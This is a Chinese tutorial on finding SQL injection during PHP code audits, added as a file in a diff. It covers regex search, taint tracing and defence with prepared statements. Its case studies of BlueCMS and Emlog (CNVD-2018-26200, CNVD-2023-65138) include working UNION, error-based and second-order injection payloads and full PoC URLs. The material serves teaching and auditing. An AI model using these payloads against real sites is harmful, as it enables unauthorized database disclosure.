@@ -1,0 +1,499 @@
+一、SQL注入的本质：程序如何被“诱导”执行恶意语句
+
+SQL 注入（SQL Injection）的核心并不是“SQL语法技巧”，而是 数据与代码混合执行的问题。
+
+典型危险代码：
+
+$id = $_GET['id'];
+$sql = "SELECT * FROM users WHERE id=$id";
+mysql_query($sql);
+
+攻击者输入：
+
+?id=1 OR 1=1
+
+数据库执行：
+
+SELECT * FROM users WHERE id=1 OR 1=1
+
+结果：
+
+整个表被查询出来。
+
+从计算机科学角度看，这是一种 解释器注入（Interpreter Injection）：
+
+用户输入 → 被拼接进入 SQL → 数据库解释执行。
+
+漏洞出现的三个必要条件：
+
+1. 用户输入可控
+
+
+2. 输入参与SQL拼接
+
+
+3. 没有安全过滤或参数化
+
+
+
+这三个条件同时满足，漏洞就诞生了。
+
+
+---
+
+二、PHP代码审计中快速发现SQL注入的方法
+
+真实项目动辄 几万到几十万行代码，逐行阅读几乎不现实。
+成熟的审计方法通常依赖 正则搜索 + 调用链追踪 + 数据流分析。
+
+常见思路：
+
+1 通过SQL语句特征快速定位
+
+SQL操作通常集中在：
+
+select
+update
+insert
+delete
+
+因此可以使用正则：
+
+(update|select|insert|delete|).*?where.*=
+
+含义：
+
+寻找 where条件中可能存在变量拼接的SQL语句。
+
+例如：
+
+$sql="select * from users where id=$id";
+
+
+---
+
+2 追踪变量是否可控
+
+代码审计的核心问题：
+
+变量是否来自用户输入
+
+常见可控源：
+
+$_GET
+$_POST
+$_COOKIE
+$_REQUEST
+
+例如：
+
+$id=$_GET['id'];
+
+如果这个变量进入SQL查询：
+
+$sql="select * from ad where id=$id";
+
+并且没有过滤：
+
+漏洞概率极高。
+
+
+---
+
+3 观察变量是否过滤
+
+常见安全处理包括：
+
+intval()
+mysqli_real_escape_string()
+addslashes()
+prepare()
+
+如果没有任何过滤：
+
+漏洞风险极大。
+
+
+---
+
+4 功能追踪（Call Trace）
+
+有时SQL不在当前文件，而在函数内部：
+
+controller.php
+  -> service.php
+     -> dao.php
+        -> SQL
+
+因此需要追踪函数调用链：
+
+功能入口
+   ↓
+控制器
+   ↓
+业务逻辑
+   ↓
+数据库操作
+
+
+---
+
+三、案例一：BlueCMS SQL注入漏洞审计
+
+BlueCMS 是一个经典的 PHP CMS，历史上曾出现过多个注入漏洞。
+
+漏洞文件：
+
+ad_js.php
+
+审计思路：
+
+第一步：正则搜索SQL
+
+(update|select|insert|delete|).*?where.*=
+
+发现：
+
+getone()
+
+相关代码：
+
+$ad_id = $_GET['ad_id'];
+
+$sql="select * from ad where ad_id=$ad_id";
+$db->getone($sql);
+
+问题：
+
+ad_id 可控
+
+没有过滤
+
+直接拼接SQL
+
+
+漏洞成立。
+
+
+---
+
+利用POC
+
+ad_js.php?ad_id=1 union select 1,2,3,4,5,6,database()
+
+SQL执行：
+
+select * from ad where ad_id=1 
+union select 1,2,3,4,5,6,database()
+
+攻击效果：
+
+返回数据库名称。
+
+
+---
+
+四、案例二：Emlog SQL注入（CNVD-2018-26200）
+
+漏洞编号：
+
+CNVD-2018-26200
+
+漏洞文件：
+
+/admin/comment.php
+
+关键代码：
+
+delCommentByIp($ip)
+
+追踪调用链：
+
+comment.php
+   ↓
+delCommentByIp()
+   ↓
+SQL删除语句
+
+核心代码：
+
+$sql="delete from comment where ip='$ip'";
+
+问题：
+
+$ip = $_GET['ip']
+
+未过滤。
+
+
+---
+
+构造利用
+
+Payload：
+
+127.0.0.1' and extractvalue(1,concat(0x7e,(select user()),0x7e)) --+
+
+完整POC：
+
+/admin/comment.php?action=delbyip&ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20user()),0x7e))--+
+
+数据库执行：
+
+delete from comment where ip='127.0.0.1'
+and extractvalue(1,concat('~',(select user()),'~'))
+
+extractvalue 会触发 XML 错误，从而泄露数据。
+
+这属于：
+
+报错注入（Error Based SQL Injection）
+
+
+---
+
+五、案例三：Emlog 二次注入漏洞
+
+二次注入（Second Order SQL Injection）是更隐蔽的一类漏洞。
+
+核心特点：
+
+Payload 不会立即触发，而是在未来某个功能中执行。
+
+漏洞编号：
+
+CNVD-2023-65138
+
+
+---
+
+审计思路
+
+利用数据库监控工具：
+
+MySQLMonitor
+
+MySQL-Monitor
+
+
+监控系统SQL执行。
+
+发现：
+
+user.php
+
+查询 nickname 字段：
+
+select * from user where nickname='xxx'
+
+nickname 来源数据库。
+
+但问题是：
+
+nickname 最初来自用户输入。
+
+
+---
+
+攻击流程
+
+第一步：写入恶意数据
+
+攻击者通过导入SQL功能：
+
+/admin/data.php
+
+导入：
+
+INSERT INTO emlog_user VALUES(
+'110',
+'',
+'$P$BnTaZnToynOoAVP6T/MiTsZc9ZAQNg.',
+(select version()),
+'writer',
+'n',
+'',
+'123@qq.com',
+'',
+'',
+'0',
+'1687261845',
+'1687261845'
+);
+
+payload 被写入数据库。
+
+
+---
+
+第二步：系统读取触发
+
+访问：
+
+/admin/user.php
+
+代码执行：
+
+$sql="select * from user where nickname='$nickname'";
+
+nickname 中的 payload 被执行。
+
+最终触发 SQL 注入。
+
+
+---
+
+六、SQL注入审计的核心方法论
+
+从多个真实案例可以总结出一套通用方法：
+
+第一步：定位SQL
+
+正则搜索：
+
+(select|update|insert|delete)
+
+
+---
+
+第二步：确认变量来源
+
+检查变量是否来自：
+
+$_GET
+$_POST
+$_COOKIE
+
+
+---
+
+第三步：追踪调用链
+
+函数调用关系：
+
+入口文件
+  ↓
+控制器
+  ↓
+业务函数
+  ↓
+数据库操作
+
+
+---
+
+第四步：检查过滤
+
+是否存在：
+
+intval
+addslashes
+mysqli_real_escape_string
+prepare
+
+如果没有：
+
+漏洞概率极高。
+
+
+---
+
+七、如何在大型项目中快速审计
+
+经验丰富的审计人员通常使用三种工具组合：
+
+1 代码搜索
+
+工具：
+
+grep
+ripgrep
+SourceGraph
+
+搜索：
+
+select
+mysql_query
+mysqli_query
+
+
+---
+
+2 SQL监控
+
+监控数据库：
+
+MySQLMonitor
+MySQL-Monitor
+
+查看：
+
+系统真实执行的SQL。
+
+
+---
+
+3 数据流分析
+
+追踪：
+
+输入 → 变量 → 函数 → SQL
+
+这本质上是 静态程序分析。
+
+
+---
+
+八、防御SQL注入的正确方式
+
+防御并不复杂，但必须严格执行。
+
+第一原则：
+
+永远不要拼接SQL
+
+错误方式：
+
+$sql="select * from user where id=$id";
+
+正确方式：
+
+$stmt = $pdo->prepare("SELECT * FROM user WHERE id=?");
+$stmt->execute([$id]);
+
+这叫：
+
+参数化查询（Prepared Statement）
+
+数据库不会把变量当SQL解释。
+
+
+---
+
+九、真正的代码审计能力是什么
+
+很多人以为代码审计是：
+
+找危险函数
+
+但实际上更像：
+
+理解程序逻辑 + 数据流动
+
+真正高手审计代码时脑中有一张图：
+
+用户输入
+   ↓
+变量传播
+   ↓
+业务逻辑
+   ↓
+数据库操作
+
+如果输入能一路流向数据库执行点：
+
+漏洞就可能出现。
+
+这也是为什么顶级漏洞研究员常说一句话：
+
+> 漏洞不在函数里，而在程序逻辑里。
